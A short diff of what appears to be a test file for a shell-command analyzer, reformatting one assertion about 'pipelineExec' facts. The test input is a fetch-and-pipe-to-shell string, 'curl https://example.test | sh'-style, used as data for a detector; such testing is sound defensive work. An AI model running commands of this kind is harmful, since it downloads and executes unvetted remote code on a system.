@@ -581,7 +581,8 @@ describe('effect facts', () => {
       null,
     ]);
     expect(
-      factsOf('x=$(curl https://example.test) | sh').facts.observed.pipelineExec,
+      factsOf('x=$(curl https://example.test) | sh').facts.observed
+        .pipelineExec,
     ).toEqual([]);
     // The same source without the surrounding pipeline still reports no pipe.
     expect(
